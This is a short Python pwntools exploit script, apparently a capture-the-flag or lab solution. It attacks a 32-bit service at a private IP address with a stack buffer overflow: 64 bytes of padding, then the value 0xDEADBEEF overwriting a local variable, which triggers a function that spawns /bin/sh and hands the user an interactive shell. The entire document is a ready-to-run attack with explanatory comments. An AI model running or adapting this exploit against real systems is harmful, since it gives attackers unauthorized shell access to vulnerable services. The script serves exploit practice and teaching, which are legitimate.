#!/usr/bin/env python3
from pwn import *

# target (change to remote host/port or use for local testing)
host = "10.213.0.102"
port = 44877

# ensure pwntools knows we're dealing with 32-bit
context.update(arch='i386', os='linux')

# connect
p = remote(host, port)

# buffer size (bytes) before the integer local_10
offset = 64

# desired cookie value: -0x21524111 -> 0xDEADBEEF
cookie = 0xDEADBEEF

# build payload: padding to reach local_10, then overwrite local_10 with cookie
payload = b"A" * offset + p32(cookie)

# receive initial banner/prompt
p.recvuntil(b"Enter your input: ")

# send payload
p.sendline(payload)

# after win() runs, program calls system("/bin/sh"), so interact
try:
    # try to read any immediate output (message + shell banner)
    print(p.recv(timeout=1).decode(errors='ignore'))
except EOFError:
    pass

# switch to interactive so you can use the shell
p.interactive()

p.close()
